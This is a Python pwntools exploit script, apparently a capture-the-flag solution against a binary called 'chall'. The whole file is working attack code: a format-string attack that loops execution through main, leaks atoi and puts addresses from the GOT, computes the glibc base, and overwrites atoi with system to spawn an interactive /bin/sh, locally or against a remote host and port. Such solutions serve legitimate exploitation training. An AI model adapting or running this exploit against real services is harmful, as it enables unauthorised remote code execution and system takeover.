#!/usr/bin/env python3

from pwn import context, ELF, log, p64, process, remote, sys, u64

context.binary = ELF('chall', checksec=False)
elf = context.binary


def get_process():
    if len(sys.argv) == 1:
        return process(elf.path)

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)


def dump(n: int) -> str:
    p = get_process()

    p.sendlineafter(b'A: ', b'1')
    p.sendlineafter(b'B: ', f'1.%{n}$lp'.encode())

    p.recvuntil(b'B: ')
    res = p.recvline().strip().split(b'.')[1].decode()

    p.close()
    return res


def leak_address(got_entry: int) -> int:
    payload_a = b'1234567.' + p64(got_entry)
    payload_b = b'1.%11$s'

    p.sendlineafter(b'A: ', payload_a)
    p.sendlineafter(b'B: ', payload_b)
    p.recvuntil(b'B: 1.')

    return u64(p.recvline().strip().ljust(8, b'\0'))


p = get_process()

pow_got = 0x601040
atoi_got = 0x601058
puts_got = 0x601018

main_addr = 0x400837

puts_offset = 0x875a0
system_offset = 0x55410

bytes_on_stack = 38
bytes_to_print = main_addr - bytes_on_stack - 2

payload_a = b'1234567.' + p64(pow_got)
payload_b = f'1.%{bytes_to_print}c'.encode() + b'%11$n'

p.sendlineafter(b'A: ', payload_a)
p.sendlineafter(b'B: ', payload_b)
p.recvline()

atoi_addr = leak_address(atoi_got)
log.success(f'Leaked atoi() address: {hex(atoi_addr)}')

puts_addr = leak_address(puts_got)
log.success(f'Leaked puts() address: {hex(puts_addr)}')

glibc_base_addr = puts_addr - puts_offset
log.success(f'Glibc base address: {hex(glibc_base_addr)}')

system_addr = glibc_base_addr + system_offset

bytes_to_print = ((system_addr & 0xffff) - bytes_on_stack - 2) % 0xffff

payload_a = b'1234567.' + p64(atoi_got) + p64(atoi_got + 2)
payload_b = f'1.%{bytes_to_print}c'.encode() + b'%11$hn'

bytes_to_print = (((system_addr >> 16) - system_addr) & 0xffff) % 0xffff

payload_b += f'%{bytes_to_print}c'.encode() + b'%12$hn'

p.sendlineafter(b'A: ', payload_a)
p.sendlineafter(b'B: ', payload_b)

p.sendlineafter(b'A: ', b'/bin/sh')
p.sendlineafter(b'B: ', b'')

p.recvuntil(b'B: ')
p.sendline()

p.interactive()
